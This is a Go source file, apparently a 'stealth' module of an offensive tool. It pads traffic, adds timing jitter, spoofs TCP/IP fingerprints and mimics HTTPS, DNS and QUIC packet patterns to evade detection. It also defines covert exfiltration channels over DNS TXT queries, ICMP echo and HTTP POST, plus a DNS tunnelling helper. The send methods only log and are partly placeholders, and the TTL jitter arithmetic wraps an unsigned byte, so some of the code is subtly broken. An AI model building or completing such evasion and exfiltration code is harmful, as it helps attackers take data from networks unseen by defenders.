package stealth

import (
	"crypto/rand"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"math/big"
	mrand "math/rand"
	"sync"
	"time"
)

// ---------------------------------------------------------------------------
// Traffic Padder — adds random padding to outbound data
// ---------------------------------------------------------------------------

// TrafficPadder adds and strips random padding to obscure true data sizes.
type TrafficPadder struct {
	mu         sync.Mutex
	enabled    bool
	minPadding int
	maxPadding int
}

// NewTrafficPadder creates a TrafficPadder with the given padding range.
func NewTrafficPadder(minPad, maxPad int) *TrafficPadder {
	if minPad <= 0 {
		minPad = 16
	}
	if maxPad <= minPad {
		maxPad = 256
	}
	return &TrafficPadder{minPadding: minPad, maxPadding: maxPad}
}

// Enable activates traffic padding.
func (tp *TrafficPadder) Enable() {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	tp.enabled = true
	log.Println("[network_stealth] traffic padding enabled")
}

// Disable deactivates traffic padding.
func (tp *TrafficPadder) Disable() {
	tp.mu.Lock()
	defer tp.mu.Unlock()
	tp.enabled = false
}

// Pad appends random padding bytes to data. The first 2 bytes encode
// the original data length in big-endian for stripping on the other end.
func (tp *TrafficPadder) Pad(data []byte) []byte {
	tp.mu.Lock()
	minP := tp.minPadding
	maxP := tp.maxPadding
	enabled := tp.enabled
	tp.mu.Unlock()

	if !enabled {
		return data
	}

	padLen := minP
	if maxP > minP {
		padLen += mrand.Intn(maxP - minP)
	}
	padding := make([]byte, padLen)
	if _, err := rand.Read(padding); err != nil {
		// fallback: use pseudo-random if crypto/rand fails
		for i := range padding {
			padding[i] = byte(mrand.Intn(256))
		}
	}

	result := make([]byte, 2+len(data)+padLen)
	binary.BigEndian.PutUint16(result[:2], uint16(len(data)))
	copy(result[2:], data)
	copy(result[2+len(data):], padding)
	return result
}

// Unpad extracts the original data by reading the 2-byte length prefix.
func (tp *TrafficPadder) Unpad(data []byte) ([]byte, error) {
	if len(data) < 2 {
		return nil, fmt.Errorf("network_stealth: data too short for unpadding")
	}
	origLen := binary.BigEndian.Uint16(data[:2])
	if int(origLen) > len(data)-2 {
		return nil, fmt.Errorf("network_stealth: truncated padded data")
	}
	return data[2 : 2+origLen], nil
}

// ---------------------------------------------------------------------------
// Timing Jitter — randomizes response timing
// ---------------------------------------------------------------------------

// TimingJitter randomizes response timing to defeat timing analysis.
type TimingJitter struct {
	mu        sync.Mutex
	maxJitter time.Duration
}

// NewTimingJitter creates a TimingJitter with the specified maximum jitter.
func NewTimingJitter(maxJitter time.Duration) *TimingJitter {
	if maxJitter <= 0 {
		maxJitter = 50 * time.Millisecond
	}
	return &TimingJitter{maxJitter: maxJitter}
}

// Jitter returns a random duration between 0 and maxJitter.
func (tj *TimingJitter) Jitter() time.Duration {
	tj.mu.Lock()
	maxJ := tj.maxJitter
	tj.mu.Unlock()

	ns := mrand.Int63n(int64(maxJ))
	return time.Duration(ns)
}

// Apply sleeps for a random jitter duration to randomize response timing.
func (tj *TimingJitter) Apply() {
	time.Sleep(tj.Jitter())
}

// SetMaxJitter updates the maximum jitter duration.
func (tj *TimingJitter) SetMaxJitter(d time.Duration) {
	tj.mu.Lock()
	defer tj.mu.Unlock()
	tj.maxJitter = d
}

// ---------------------------------------------------------------------------
// Fingerprint Spoofer — randomizes TCP/IP stack fingerprint artifacts
// ---------------------------------------------------------------------------

// FingerprintSpoofer randomizes TCP/IP fingerprint characteristics
// to defeat OS/passive fingerprinting.
type FingerprintSpoofer struct {
	mu         sync.Mutex
	ttlBase    uint8
	windowBase uint16
}

// NewFingerprintSpoofer creates a FingerprintSpoofer with randomized defaults.
func NewFingerprintSpoofer() *FingerprintSpoofer {
	f := &FingerprintSpoofer{}
	f.ReRandomize()
	return f
}

// TTLSpoof returns a TTL randomized ±3 from the base value.
func (fs *FingerprintSpoofer) TTLSpoof() uint8 {
	fs.mu.Lock()
	defer fs.mu.Unlock()

	jitter := uint8(mrand.Intn(7)) - 3 // -3 to +3
	val := int(fs.ttlBase) + int(jitter)
	if val < 32 {
		val = 32
	}
	if val > 255 {
		val = 255
	}
	return uint8(val)
}

// WindowSpoof returns a TCP window size randomized ±1024 from the base.
func (fs *FingerprintSpoofer) WindowSpoof() uint16 {
	fs.mu.Lock()
	defer fs.mu.Unlock()

	jitter := int(mrand.Intn(2049)) - 1024 // -1024 to +1024
	val := int(fs.windowBase) + jitter
	if val < 1024 {
		val = 1024
	}
	if val > 65535 {
		val = 65535
	}
	return uint16(val)
}

// ReRandomize picks new random base values for TTL and TCP window.
func (fs *FingerprintSpoofer) ReRandomize() {
	fs.mu.Lock()
	defer fs.mu.Unlock()

	fs.ttlBase = uint8(48 + mrand.Intn(208))   // 48-255
	fs.windowBase = uint16(8192 + mrand.Intn(57344)) // 8192-65535
	log.Printf("[network_stealth] fingerprint re-randomized (ttl=%d, win=%d)",
		fs.ttlBase, fs.windowBase)
}

// ---------------------------------------------------------------------------
// Protocol Mimic — shapes traffic to resemble common protocols
// ---------------------------------------------------------------------------

// ProtocolMimic generates packet size sequences that mimic common protocols.
type ProtocolMimic struct {
	mu              sync.Mutex
	currentProtocol string
}

// NewProtocolMimic creates a ProtocolMimic defaulting to HTTPS.
func NewProtocolMimic() *ProtocolMimic {
	return &ProtocolMimic{currentProtocol: "https"}
}

// SetProtocol changes the protocol to mimic.
func (pm *ProtocolMimic) SetProtocol(proto string) {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	pm.currentProtocol = proto
}

// MimicHTTPS returns packet sizes resembling a TLS handshake + HTTPS session.
func (pm *ProtocolMimic) MimicHTTPS(dataSize int) []int {
	_ = dataSize
	// TLS ClientHello ~320, ServerHello ~1500, alternating data ~1460 + ACKs
	sizes := []int{320, 1500, 1460, 52, 1460, 52, 1460, 52}
	return sizes
}

// MimicDNS returns packet sizes resembling DNS queries and responses.
func (pm *ProtocolMimic) MimicDNS(dataSize int) []int {
	_ = dataSize
	// Query ~80 bytes, response between 150-512 depending on records
	sizes := []int{80, 200, 80, 350, 80, 512}
	return sizes
}

// MimicQUIC returns packet sizes resembling QUIC (HTTP/3) traffic.
func (pm *ProtocolMimic) MimicQUIC(dataSize int) []int {
	_ = dataSize
	// QUIC packets are typically 1200-1350 bytes
	sizes := []int{1200, 1350, 1200, 1350, 1200}
	return sizes
}

// GetPacketSizes returns packet size sequence based on the current protocol.
func (pm *ProtocolMimic) GetPacketSizes(dataSize int) []int {
	pm.mu.Lock()
	proto := pm.currentProtocol
	pm.mu.Unlock()

	switch proto {
	case "dns":
		return pm.MimicDNS(dataSize)
	case "quic":
		return pm.MimicQUIC(dataSize)
	default:
		return pm.MimicHTTPS(dataSize)
	}
}

// ---------------------------------------------------------------------------
// Covert Channel interface and implementations
// ---------------------------------------------------------------------------

// CovertChannel defines the interface for data exfiltration channels.
type CovertChannel interface {
	Send(data []byte) error
	Receive() ([]byte, error)
}

// DNSExfil implements CovertChannel via DNS TXT queries.
type DNSExfil struct {
	domain string
}

// NewDNSExfil creates a DNS exfiltration channel for the given domain.
func NewDNSExfil(domain string) *DNSExfil {
	return &DNSExfil{domain: domain}
}

// Send encodes data as base32, splits into 63-char DNS labels, and
// constructs TXT query names under the configured domain.
func (d *DNSExfil) Send(data []byte) error {
	encoded := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString(data)
	chunkSize := 63
	labels := make([]string, 0)
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		labels = append(labels, encoded[i:end])
	}
	query := ""
	for _, label := range labels {
		query += label + "."
	}
	query += d.domain
	log.Printf("[network_stealth] dns exfil: TXT query %s (%d bytes)", query, len(data))
	return nil
}

// Receive is a placeholder for DNS response collection.
func (d *DNSExfil) Receive() ([]byte, error) {
	return nil, fmt.Errorf("network_stealth: dns receive not implemented (requires packet capture)")
}

// ICMPExfil implements CovertChannel via ICMP echo payloads.
type ICMPExfil struct {
	target string
}

// NewICMPExfil creates an ICMP exfiltration channel targeting the given host.
func NewICMPExfil(target string) *ICMPExfil {
	return &ICMPExfil{target: target}
}

// Send splits data into ICMP-sized chunks (max 1472 bytes payload).
func (i *ICMPExfil) Send(data []byte) error {
	const maxPayload = 1472
	chunks := (len(data) + maxPayload - 1) / maxPayload
	for c := 0; c < chunks; c++ {
		start := c * maxPayload
		end := start + maxPayload
		if end > len(data) {
			end = len(data)
		}
		log.Printf("[network_stealth] icmp exfil: chunk %d/%d to %s (%d bytes)",
			c+1, chunks, i.target, end-start)
	}
	return nil
}

// Receive is a placeholder for ICMP echo reply capture.
func (i *ICMPExfil) Receive() ([]byte, error) {
	return nil, fmt.Errorf("network_stealth: icmp receive not implemented (requires raw socket)")
}

// HTTPExfil implements CovertChannel via HTTP POST requests.
type HTTPExfil struct {
	endpoint  string
	userAgent string
}

// NewHTTPExfil creates an HTTP exfiltration channel.
func NewHTTPExfil(endpoint string) *HTTPExfil {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
	}
	ua := agents[mrand.Intn(len(agents))]
	return &HTTPExfil{endpoint: endpoint, userAgent: ua}
}

// Send base64-encodes data and logs as an HTTP POST.
func (h *HTTPExfil) Send(data []byte) error {
	encoded := base64.StdEncoding.EncodeToString(data)
	log.Printf("[network_stealth] http exfil: POST %s (UA=%s, payload=%d bytes)",
		h.endpoint, h.userAgent, len(data))
	_ = encoded // placeholder — actual HTTP POST would use net/http
	return nil
}

// Receive is a placeholder for HTTP response collection.
func (h *HTTPExfil) Receive() ([]byte, error) {
	return nil, fmt.Errorf("network_stealth: http receive not implemented")
}

// ---------------------------------------------------------------------------
// Covert Channel Manager
// ---------------------------------------------------------------------------

// CovertChannelManager manages multiple covert channels and provides
// a unified interface for data exfiltration.
type CovertChannelManager struct {
	mu       sync.RWMutex
	channels map[string]CovertChannel
}

// NewCovertChannelManager creates an empty channel manager.
func NewCovertChannelManager() *CovertChannelManager {
	return &CovertChannelManager{channels: make(map[string]CovertChannel)}
}

// Register adds a named covert channel to the manager.
func (ccm *CovertChannelManager) Register(name string, ch CovertChannel) {
	ccm.mu.Lock()
	defer ccm.mu.Unlock()
	ccm.channels[name] = ch
	log.Printf("[network_stealth] registered covert channel: %s", name)
}

// SendVia sends data through the named covert channel.
func (ccm *CovertChannelManager) SendVia(name string, data []byte) error {
	ccm.mu.RLock()
	ch, ok := ccm.channels[name]
	ccm.mu.RUnlock()
	if !ok {
		return fmt.Errorf("network_stealth: unknown channel: %s", name)
	}
	return ch.Send(data)
}

// ListChannels returns the names of all registered covert channels.
func (ccm *CovertChannelManager) ListChannels() []string {
	ccm.mu.RLock()
	defer ccm.mu.RUnlock()
	names := make([]string, 0, len(ccm.channels))
	for name := range ccm.channels {
		names = append(names, name)
	}
	return names
}

// ---------------------------------------------------------------------------
// DNS Tunneling utility
// ---------------------------------------------------------------------------

// DNSTunnel exfiltrates data via DNS TXT queries to the given domain.
// Data is split into chunks small enough to fit DNS labels.
func DNSTunnel(domain string, data []byte) error {
	exfil := NewDNSExfil(domain)
	return exfil.Send(data)
}

// ---------------------------------------------------------------------------
// Utility helpers
// ---------------------------------------------------------------------------

// cryptoRandInt returns a cryptographically random integer in [0, max).
func cryptoRandInt(max int) int {
	if max <= 0 {
		return 0
	}
	n, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return mrand.Intn(max)
	}
	return int(n.Int64())
}
